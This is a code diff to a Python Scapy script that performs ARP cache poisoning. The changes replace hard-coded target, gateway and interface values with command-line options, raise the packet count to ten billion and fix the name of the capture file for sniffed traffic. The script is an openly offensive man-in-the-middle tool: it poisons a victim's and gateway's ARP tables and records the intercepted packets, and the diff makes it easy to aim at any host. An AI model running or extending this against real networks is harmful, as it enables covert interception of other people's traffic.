@@ -4,13 +4,34 @@ import sys
 import threading
 import signal
 import time
+import optparse
 
 timestr = time.strftime("%Y%m%d_%H%M%S")
-interface = "eth1"
-target_ip = "192.168.1.15"
-gateway_ip = "192.168.1.1"
-packet_count = 1000
+# use command line mode to receive arguments
+#interface = "en1"
+#target_ip = "192.168.1.15"
+#gateway_ip = "192.168.1.1"
+packet_count = 10000000000
 poisoning = True
+
+
+##### add the parser option #####
+
+parser = optparse.OptionParser('usage % -t <target ip> -g <gateway ip> -i <interface>')
+
+parser.add_option('-t', dest='target', type='string',help='spacify target ip')                                       
+parser.add_option('-g', dest='gateway', type='string',help='spacify gateway ip')          
+parser.add_option('-i', dest='interface', type='string',help='spacify your interface EX:eth0')                                       
+(options, args) = parser.parse_args()    
+if options.target == None or options.gateway == None or options.interface ==None: 
+    print parser.usage
+    sys.exit(0)
+
+
+gateway_ip = options.gateway                                           
+target_ip = options.target                                             
+interface = options.interface
+
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     # slightly different method using send
@@ -65,6 +86,10 @@ conf.verb = 0
 
 print "[*] Setting up %s" % interface
 
+
+
+
+
 gateway_mac = get_mac(gateway_ip)
 
 if gateway_mac is None:
@@ -98,7 +123,7 @@ except KeyboardInterrupt:
 finally:
     # write out the captured packets
     print "[*] Writing packets to arper.pcap"
-    wrpcap( 'trace' + timestr + '.pacp' , packets)
+    wrpcap( 'trace' + timestr + '.pcap' , packets)
 
     # get the poison thread to stop
     poisoning = False
